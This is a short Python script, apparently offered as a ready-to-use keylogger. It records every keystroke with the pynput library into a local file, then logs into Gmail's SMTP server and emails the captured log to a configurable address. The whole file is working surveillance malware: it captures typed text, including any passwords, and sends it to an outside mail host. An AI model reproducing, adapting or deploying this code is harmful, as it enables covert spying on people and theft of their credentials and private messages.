from pynput.keyboard import Key, Listener
from datetime import datetime
import smtplib,ssl
sender_mail = "user@domain.com"     # Replace user@domain.com with your email id (everywhere)
#prefer using your own email id for receiver's as well.
receiver_mail = "user@domain.com"  # Replace user@domain.com with your email id (everywhere)
password = "passcode"              # Enter your Password here
port = 587
message = """From: user@domain.com
To: user@domain.com                         
Subject: KeyLogs


Text: Keylogs 
"""

count = 0
keys = []


with open("keylogger.txt", "a") as f:
    f.write("TimeStamp: "+(str(datetime.now()))[:-7]+":\n")
    f.write("\n")


def on_press(key):
    global count, keys
    keys.append(key)
    count += 1
    if count >= 5:
        count = 0
        write_file(keys)
        keys = []


def on_release(key):
    if key == Key.esc:
        return False


def write_file(keys):
    with open("keylogger.txt", "a") as f:
        for idx, key in enumerate(keys):
            k = str(key).replace("'", "")
            if k.find("space") > 0 and k.find("backspace") == -1:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)


if __name__ == "__main__":
    with Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()

    with open("keylogger.txt", "a") as f:
        f.write("\n\n")
        f.write("--------------------------------------------------------------------")
        f.write("\n\n")

with open("keylogger.txt",'r') as f:
    temp = f.read()
    message = message + str(temp)
    f.close()

context = ssl.create_default_context()
server = smtplib.SMTP('smtp.gmail.com', port)
server.starttls()
server.login(sender_mail,password)
server.sendmail(sender_mail,receiver_mail,message)
print("Email Sent to ",sender_mail)
server.quit()
